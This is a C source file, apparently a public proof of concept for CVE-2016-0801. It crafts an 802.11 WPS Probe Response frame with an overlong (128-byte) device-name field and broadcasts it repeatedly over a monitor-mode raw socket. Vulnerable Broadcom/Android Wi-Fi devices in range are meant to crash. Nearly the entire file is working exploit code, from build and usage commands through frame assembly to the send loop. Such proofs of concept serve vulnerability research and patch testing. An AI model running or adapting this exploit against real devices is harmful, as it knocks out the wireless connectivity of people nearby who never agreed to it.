/*
 * Copyright (C) 2016 by AbdSec Core Team <ok@abdsec.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

 /*
    USAGE

    # airmon-ng start wlan0
    # gcc -o wps wps.c -Wall -O2 -DDEBUG -DSHOW
    # ./wps
    Total Wps Length: 118

    [99]  SSID: DON'T_CONNECT
	  DEST: ff ff ff ff ff ff
	  Sending Packet (315 byte) ...

	  ...
 */

 /*
    This is a proof of concept for CVE-2016-0801 Bug
    the program proceeds as follows:
    o  A new WPS Probe Response packet is generated.
    o  The device_name field of this packet is filled with some string that's longer than hundered characters.
    o  This packet is broadcasted on the network( interface needs to be on monitor mode for this to work).
    At this point the device picking up this packet, identified by its mac address(DESTINATION_MAC), should have crashed.

    the following patch shows how contributor fixed the bug
    https://android.googlesource.com/kernel/msm/+/68cdc8df1cb6622980b791ce03e99c255c9888af%5E!/#F0


    Wireshark filter for displaying PROBE RESPONSE packets: wlan.fc.type_subtype == 0x05
    Reference WPS Architecture: http://v1ron.ru/downloads/docs/Wi-Fi%20Protected%20Setup%20Specification%201.0h.pdf

    Acımasız Tom'a Sevgilerle :)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <linux/wireless.h>
#include <assert.h>


#define calc_size(x)	(sizeof(x) - 2)
#define reverse8(x)	(x<<4&0xf0) | ((x>>4)&0x0f)    /* 0XAB becomes 0XBA 	*/
#define reverse16(x)	(x&0xff00)>>8 | (x&0x00ff)<<8  /* 0XABCD becomes 0XCDAB */

#define PROBE_REQUEST		0x04
#define PROBE_RESPONSE		0x05
#define BEACON			0x08

#define SOURCE_MAC		"\xaa\xbb\xdd\x55\xee\xcc"

/* Do NOT forget to set your target's mac address */
#define DESTINATION_MAC 	"\xff\xff\xff\xff\xff\xfc"

#define SSID		"DON'T_CONNECT"

/* Tag Number Definitions */
#define SSID_t		0x00
#define RATES_t  	0x01
#define DS_t	 	0x03
#define ERP_t		0x2a
#define ESR_t	 	0x32
#define RSN_t	 	0x30
#define HTC_t		0x2d
#define HTI_t	 	0x3d
#define VENDOR_t   	0xdd

#define OUI_AES		"\x00\x0f\xac"
#define OUI_Microsof	"\x00\x50\xf2"


/* Data Element Type Definitions for WPS Probe Response */

#define VERSION					0x104a
#define WPS_STATE				0x1044
#define SELECTED_REGISTRAR			0x1041
#define DEVICE_PASSWORD_ID			0x1012
#define SELECTED_REGISTRAR_CONFIG_METHODS	0x1053
#define RESPONSE_TYPE				0x103b
#define UUID_E					0x1047
#define MANUFACTURER				0x1021
#define MODEL_NAME				0x1023
#define MODEL_NUMBER				0x1024
#define SERIAL_NUMBER				0x1042
#define PRIMARY_DEVICE_TYPE			0x1054
#define WPS_ID_DEVICE_NAME			0x1011
#define CONFIG_METHODS	 			0x1008

/* Just cloned from a sniffed packet */
#define RATES_v		"\x82\x84\x8b\x96"
#define ESRATES_v	"\x8c\x12\x98\x24\xb0\x48\x60\x6c"

/* Wps Version */
#define WV	0x10
/* Wps State */
#define WS	0x01
/* Selected Registrar */
#define SR	0x02
/* Response Type */
#define RT 	0x03

/* For Device Password ID */
#define PIN	0x0000
/* For Selected Registrar Config Methods */
#define SRCM	0x018c
/* For Config Methods */
#define CM	0x0004


/* For Broadcast */
#define DELAY	200000
/* !!! Monitor mode on  !!!*/
#define IFACE 	"mon0"

#define MAX_SIZE	1024

/* Max Tag Length */
#define MAX_TL	 	0xff

typedef uint8_t u8;
typedef uint16_t u16;

/* Common Tags */
typedef struct {
    /* Tag Number */
    u8 tn;
    /* Tag Length */
    u8 tl;
} com_a;

typedef struct {
    u8 oui[3];
    u8 type;
} com_b;

typedef struct data_definition{
    /* Data Element Type */
    u16 det;
    /* Data Element Length */
    u16 del;
} def;


/* Common Wps Tags */
typedef struct wtag_8 {
    def init;
    u8 item;
} __attribute__((packed)) wtag_a;


typedef struct wtag_16 {
    def init;
    u16 item;
} __attribute__((packed)) wtag_b;


typedef struct wtag_point {
    def init;
    char *item;
} __attribute__((packed)) wtag_c;


struct ie80211_hdr {
    u8 type;
    u8 flags;
    u16 duration;
    u8 dest[6];
    u8 source[6];
    u8 bssid[6];
    u8 fragment_no;
    u8 sequence_no;
};

/* Dynamic Tag */
struct ssid {
    com_a  head;
    u8 *ssid;
};

/* Tagged Parameters */
struct Wifi_Tags {

    struct {
	com_a head;
	u8 rates[4];
    } rates;

    struct  {
	com_a head;
	u8 channel;
    } ds;

    struct {
	com_a head;
	u8 erp_info;
    } erp_info;

    /* Extended Support Rates */
    struct {
	com_a head;
	u8 rates[8];
    } esr;

    struct {
	com_a head;
	u16 version;
	/* Group Chipher Suite */
	com_b gcp;
	u16 pcs_count;
	/* Pairwise Chipher Suite */
	com_b pcs;
	u16 akm_count;
	/* Auth Key Management */
	com_b akm;
	u16 rsn;
    } rsn_info;

    struct {
	com_a head;
	com_b wpa_o;
	u16 version;
	/* Multi Chipher Suite */
	com_b mcs;
	u16 ucs_count;
	/* Unicast Chipher Suite */
	com_b ucs;
	/* Auth Key Management */
	u16 akm_count;
	com_b akm;
    } wpa;

    struct {
	com_a head;
	u16 info;
	u8 mpdu;
	u8 scheme[16];
	u16 capabilities;
	u16 transmit;
	u8 asel;
    } ht_capabilites __attribute__((packed));

    struct {
	com_a head;
	u8 channel;
	u8 subset1;
	u16 subset2;
	u16 subset3;
	u8 scheme[16];
    } ht_info;
};

/*
 * WPS Tag Probe Response
 */
struct WPSProbeRespIe {
    com_a head;
    com_b wps_o;
    wtag_a version;
    /* Wifi Protected Setup State */
    wtag_a wpss;
    /* Selected Registrar */
    wtag_a sreg;
    /* Device Password Id */
    wtag_b dpi;
    /* Selected Registrar Config Methods */
    wtag_b srcm;
    /* Response Type */
    wtag_a resp;
    /* uuid 16 byte */
    wtag_c uuid;
    /* Manufacturer */
    wtag_c man;
    /* Model Name */
    wtag_c mname;
    /* Model Number */
    wtag_c numb;
    /* Serial Number */
    wtag_c serial;
    /* Primary_device_type */
    wtag_c dev_type;
    /* Device Name */
    wtag_c dname;
    /* Config Methods */
    wtag_b cmeth;
};

/* wtag_c pointer is address list from WPSProbeRespIE */
static long wtag_c_point[7];


/* Insert WPS Frames In Line With Types  */

static void
inwps_a( wtag_a *tag, u16 det, u8 par )
{
    tag->init.det = reverse16(det);
    tag->init.del = reverse16(0x01);
    tag->item = par;
}

static void
inwps_b( wtag_b *tag, u16 det, u16 par )
{
    tag->init.det = reverse16(det);
    tag->init.del = reverse16(0x02);
    tag->item = reverse16(par);
}

static void
inwps_c( wtag_c *tag, u16 det, char *par )
{
    static int counter = 0;
    int i = strlen(par);
    i = i > MAX_TL ? MAX_TL : i;
    tag->item = ( char * ) calloc( i, sizeof(char) );

    tag->init.det = reverse16(det);
    tag->init.del = reverse16(i);

    strncpy( tag->item, par, i );
    wtag_c_point[counter++] = (long )(void *)&(tag->item);
}

/*  Convert 'struct WPSProbeRespIe' to bytearray  */
int
wtoa( char *pop, struct WPSProbeRespIe *tag )
{
    unsigned char *a = (void *)tag;
    char *tmp;
    long tmp_a;
    int i = 0, p = 0, co = 0, j;
    int size = sizeof(struct WPSProbeRespIe);

    while( p < size )
    {
	if( wtag_c_point[co] == (long)(a+p) ){
	    assert(co++ < 7);
	    tmp_a = 0;
	    for( j = 0; j < 32; j+=8 )
		tmp_a |= *(a+p++)<<j;

	    tmp = (char *)tmp_a;
	    j = 0;
	    while( tmp[j] )
		pop[i++] = tmp[j++];

#ifdef __x86_64__
	    p+=4;
#endif
	    free( tmp );
	}else
	    pop[i++] = *(a+p++);
    }
#ifdef DEBUG
    printf("Total Wps Length: %d\n", i);
#endif

    /* wps->head.tl */
    pop[1] = i-2;
    assert(i <= MAX_TL+1);
    /* i is array length */

    return( i );
}


struct WPSProbeRespIe *
set_wps_probe_response(void)
{
    struct WPSProbeRespIe *wps  = ( struct WPSProbeRespIe * )	\
				    malloc( sizeof(struct WPSProbeRespIe) );

    char *uuid 		=  calloc( MAX_TL, sizeof(char) );
    char *manufacturer  =  calloc( MAX_TL, sizeof(char) );
    char *model_name    =  calloc( MAX_TL, sizeof(char) );
    char *model_number  =  calloc( MAX_TL, sizeof(char) );
    char *serial_number	=  calloc( MAX_TL, sizeof(char) );
    char *device_type 	=  calloc( MAX_TL, sizeof(char) );
    char *device_name 	=  calloc( MAX_TL, sizeof(char) );

    /*
     * Fill them as you wish, but do NOT exceed
     * 0xff (256 bytes) length
     */
    memset( uuid, 	  'B', 16 );
    memset( manufacturer, 'A', 8 );
    memset( model_name,	  'D', 8 );
    memset( model_number, 'B', 8 );
    memset( serial_number,'O', 8 );
    memset( device_type,  'Y', 8 );
    memset( device_name,  'S', 128 );	/* For Broadcom CVE-2016-0801 > 100 */


    /* Tag Number Vendor Specific  */
    wps->head.tn = VENDOR_t;
    /* The length will calculate after it packages */
    wps->head.tl = 0x00;

    /* OUI: Microsof */
    memcpy( wps->wps_o.oui, OUI_Microsof, sizeof(OUI_Microsof));
    wps->wps_o.type = 0x04;

    inwps_a( &wps->version, VERSION, WV );
    inwps_a( &wps->wpss, WPS_STATE, WS );
    inwps_a( &wps->sreg, SELECTED_REGISTRAR, SR );
    inwps_b( &wps->dpi, DEVICE_PASSWORD_ID, PIN );
    inwps_b( &wps->srcm, SELECTED_REGISTRAR_CONFIG_METHODS, SRCM );
    inwps_a( &wps->resp, RESPONSE_TYPE, RT );
    inwps_c( &wps->uuid, UUID_E, uuid );
    inwps_c( &wps->man, MANUFACTURER, manufacturer );
    inwps_c( &wps->mname, MODEL_NAME, model_name );
    inwps_c( &wps->numb, MODEL_NUMBER, model_number );
    inwps_c( &wps->serial, SERIAL_NUMBER, serial_number );
    inwps_c( &wps->dev_type, PRIMARY_DEVICE_TYPE, device_type );
    inwps_c( &wps->dname, WPS_ID_DEVICE_NAME, device_name );
    inwps_b( &wps->cmeth, CONFIG_METHODS, CM );

    free( uuid );
    free( manufacturer );
    free( model_name );
    free( model_number );
    free( serial_number );
    free( device_type );
    free( device_name );

    return( wps );
}


int
create_wifi(char *pop)
{
    /*
     *  struct for radiotap_hdr and fixed_hdr are missing
     */
    char radiotap_hdr[26];
    char fixed_hdr[12];
    struct ie80211_hdr *ie = calloc( sizeof(struct ie80211_hdr), 1 );
    struct Wifi_Tags *tag = calloc( sizeof(struct Wifi_Tags), 1 );
    struct ssid *ssid;
    int i, len = 0;

    memset( radiotap_hdr, 0, sizeof(radiotap_hdr) );
    radiotap_hdr[2] = 26;	/* Header Length */

    memset( fixed_hdr, 'A', sizeof(fixed_hdr) );

    ie->type = reverse8(PROBE_RESPONSE);
    memcpy( ie->dest, DESTINATION_MAC, 6 );
    memcpy( ie->source, SOURCE_MAC, 6 );
    memcpy( ie->bssid, SOURCE_MAC, 6 );

    i = strlen( SSID );
    ssid = calloc( i+2, 1 );
    ssid->head.tn = SSID_t;
    ssid->head.tl = i;
    ssid->ssid = calloc(i,1);
    memcpy( ssid->ssid, SSID, i );

    tag->rates.head.tn = RATES_t;
    tag->rates.head.tl = calc_size(tag->rates);
    memcpy(tag->rates.rates, RATES_v, sizeof(tag->rates.rates));

    tag->ds.head.tn = DS_t;
    tag->ds.head.tl = calc_size(tag->ds);
    tag->ds.channel = 1;

    tag->erp_info.head.tn = ERP_t;
    tag->erp_info.head.tl = calc_size(tag->erp_info);
    tag->erp_info.erp_info = 0x00;

    tag->esr.head.tn = ESR_t;
    tag->esr.head.tl = calc_size(tag->esr);
    memcpy(tag->esr.rates, ESRATES_v, sizeof(tag->esr.rates));

    tag->rsn_info.head.tn = RSN_t;
    tag->rsn_info.head.tl = calc_size(tag->rsn_info);
    tag->rsn_info.version = 1;

    memcpy( tag->rsn_info.gcp.oui, OUI_AES, 	\
			sizeof(tag->rsn_info.gcp.oui) );
    tag->rsn_info.gcp.type = 0x04;	/* AES(CCM) */

    tag->rsn_info.pcs_count = 1;
    memcpy( tag->rsn_info.pcs.oui, OUI_AES, 	\
			sizeof(tag->rsn_info.pcs.oui) );
    tag->rsn_info.pcs.type = 0x04;	/* AES(CCM) */

    tag->rsn_info.akm_count = 1;
    memcpy( tag->rsn_info.akm.oui, OUI_AES, 	\
			sizeof(tag->rsn_info.akm.oui) );
    tag->rsn_info.pcs.type = 0x02;

    tag->rsn_info.rsn = 0x0000;

    tag->wpa.head.tn = VENDOR_t;
    tag->wpa.head.tl = calc_size(tag->wpa);
    memcpy( tag->wpa.wpa_o.oui, OUI_Microsof, 	\
			sizeof(tag->wpa.wpa_o.oui) );
    tag->wpa.wpa_o.type = 1;
    tag->wpa.version = 1;

    memcpy( tag->wpa.mcs.oui, OUI_Microsof, 	\
			sizeof(tag->wpa.mcs.oui) );
    tag->wpa.mcs.type = 0x04;
    tag->wpa.ucs_count = 1;
    memcpy( tag->wpa.ucs.oui, OUI_Microsof, 	\
			sizeof(tag->wpa.ucs.oui) );
    tag->wpa.ucs.type = 0x04;

    tag->wpa.akm_count = 1;
    memcpy( tag->wpa.akm.oui, OUI_Microsof, 	\
			sizeof(tag->wpa.akm.oui) );
    tag->wpa.akm.type = 0x02;

    tag->ht_capabilites.head.tn = HTC_t;
    tag->ht_capabilites.head.tl = calc_size(tag->ht_capabilites);
    tag->ht_capabilites.info = 0x104e;
    tag->ht_capabilites.mpdu = 0x1f;
    tag->ht_capabilites.scheme[0] = 0xff;
    tag->ht_capabilites.scheme[1] = 0xff;
    tag->ht_capabilites.capabilities = 0x0004;

    tag->ht_info.head.tn = HTI_t;
    tag->ht_info.head.tl = calc_size(tag->ht_info);
    tag->ht_info.channel = 11;
    tag->ht_info.subset1 = 0x07;
    tag->ht_info.subset2 = 0x0001;
    tag->ht_info.scheme[0] = 0x0f;

    memcpy( pop, radiotap_hdr, sizeof(radiotap_hdr) );
    memcpy( &pop[len+=sizeof(radiotap_hdr)], 		\
	    (u8 *)ie, sizeof(struct ie80211_hdr) );
    memcpy( &pop[len+=sizeof(struct ie80211_hdr)],	\
	    fixed_hdr, sizeof(fixed_hdr) );
    memcpy( &pop[len+=sizeof(fixed_hdr)], 		\
	    (u8 *)&ssid->head, 2 );
    memcpy( &pop[len+=2], ssid->ssid, i );
    memcpy( &pop[len+=i], (u8 *) tag, 			\
	    sizeof(struct Wifi_Tags) );
    len+=sizeof(struct Wifi_Tags);

    free( ssid );
    free( tag );
    free( ie );

    return (len);
}

int
broadcast(char *packet, int len)
{
    struct sockaddr_ll sll;
    struct ifreq ifr;
    struct iwreq iwr;
    int sock, ret, count = 100;

    sock = socket( AF_PACKET, SOCK_RAW, 0x300 );
    if(sock < 0){
	perror("socket() failed");
	exit(EXIT_FAILURE);
    }

    memset( &ifr, 0, sizeof(ifr) );
    strncpy( ifr.ifr_name, IFACE, sizeof(ifr.ifr_name) );

    if( ioctl( sock, SIOCGIFINDEX, &ifr ) < 0 ){
	perror( "ioctl(SIOCGIFINDEX) failed" );
	close(sock);
	exit(EXIT_FAILURE);
    }

    memset( &sll, 0, sizeof(sll) );
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex  = ifr.ifr_ifindex;

    if( ioctl( sock, SIOCGIFHWADDR, &ifr ) < 0 )
    {
	perror( "ioctl(SIOCGIFHWADDR) failed" );
	close(sock);
	exit(EXIT_FAILURE);
    }

    memset( &iwr, 0, sizeof( struct iwreq ) );
    strncpy( iwr.ifr_name, IFACE, IFNAMSIZ );

    if( ioctl( sock, SIOCGIWMODE, &iwr ) < 0 )
	iwr.u.mode = IW_MODE_MONITOR;

    ifr.ifr_flags |= IFF_UP | IFF_BROADCAST | IFF_RUNNING;

    if ( (ioctl(sock, SIOCGIFFLAGS, &ifr)) < 0 ){
	perror("ioctl(SIOCGIFFLAGS) failed");
	close(sock);
	exit(EXIT_FAILURE);
    }

    if( bind( sock, (struct sockaddr *) &sll,
		sizeof( sll ) ) < 0 )
    {
	perror( "bind() failed" );
	close(sock);
	exit(EXIT_FAILURE);
    }

    while( count-- ){
#ifdef SHOW
	int i;
	printf("\n\033[34m [\033[31m%d\033[34m] \033[33m", count);
	printf("\tSSID: %s\n", SSID);
	printf("\tDEST: ");
	for(i=0;i<6;i++)
	    printf("%02x ", DESTINATION_MAC[i]&0xff);
	printf("\n\tSending Packet (%d byte) ...\033[0m\n", len);
#endif
	ret = write( sock, packet, len );
	if( ret < 0 ){
	    perror("write() failed");
	    close( sock );
	    exit(EXIT_FAILURE);
	}
     	usleep( DELAY );
    }
    return 0;
}

int
main(void)
{
    char *packet = (char *) calloc( MAX_SIZE, sizeof(char) );
    struct WPSProbeRespIe *wps;
    int len;

    len = create_wifi( packet );
    wps = set_wps_probe_response();
    len += wtoa( &packet[len], wps );
    broadcast( packet, len );

    free( wps );
    free( packet );

    return 0;
}